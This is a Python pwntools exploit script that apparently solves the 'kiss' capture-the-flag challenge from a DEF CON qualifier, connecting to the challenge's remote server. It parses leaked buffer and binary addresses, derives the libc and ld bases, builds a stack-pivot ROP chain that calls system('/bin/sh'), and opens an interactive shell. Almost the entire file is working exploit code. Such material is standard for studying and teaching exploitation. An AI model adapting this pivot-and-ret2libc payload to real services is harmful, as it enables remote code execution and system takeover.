from pwn import *

#p = process("./kiss");
p = remote("kiss_88581d4e20dc97355f1d86b6905f6103.quals.shallweplayaga.me", 3155)

p.recvuntil('Buffer is around ')
buf = p.recvuntil('\n', drop=True)
buf = int(buf, 16)
print 'buf base: %s' % hex(buf)

p.recvuntil('Binary is around ')
binary_base = p.recvuntil('\n', drop=True)
binary_base = int(binary_base, 16)
print 'binary base: %s' % hex(binary_base)

p.recvuntil('How big of a buffer do you want? ')
p.sendline('0xa00')

p.recvuntil('Waiting for data.\n')

'''gdb-peda$ x/10i 0x00007f8471f3e000 + 0x16aa1
   0x7f8471f54aa1 <_dl_runtime_profile+1361>:	mov    rsp,rbx
   0x7f8471f54aa4 <_dl_runtime_profile+1364>:	mov    rbx,QWORD PTR [rsp]
   0x7f8471f54aa8 <_dl_runtime_profile+1368>:	add    rsp,0x30
   0x7f8471f54aac <_dl_runtime_profile+1372>:	ret
  
  gdb-peda$ x/4i 0x00007f6bbfeb6000 + 0x7b84
     0x7f6bbfebdb84 <_dl_dst_substitute+148>:	pop    rdi
	    0x7f6bbfebdb85 <_dl_dst_substitute+149>:	ret
'''
ld_base = binary_base - 0x225000
libc_base = ld_base - 0x3c5000
system = libc_base + 0x46640
binsh = libc_base + 0x17ccdb
pop_rdi_ret = ld_base + 0x7b84

pivot = ld_base + 0x16aa1
static_addr = buf + 0xc00
gadget_offset = 0x900 / 8

payload = ''
for i in xrange(0x900 / 8):
	payload += p64(static_addr + (gadget_offset - i) * 0x8)

payload += p64(static_addr - 0x8)
#payload += p64(static_addr + 0x10)
payload += p64(pivot)
payload += p64(0x4141414141414142)
payload += p64(0x4141414141414143)
payload += p64(0x4141414141414144)
payload += p64(0x4141414141414145)

payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)

payload = payload.ljust(0xa00, 'B')

p.send(payload)

p.recvuntil('What location shall we attempt? ')

# raw_input('wait')
#gdb.attach(p)

p.sendline(hex(static_addr))
p.interactive()





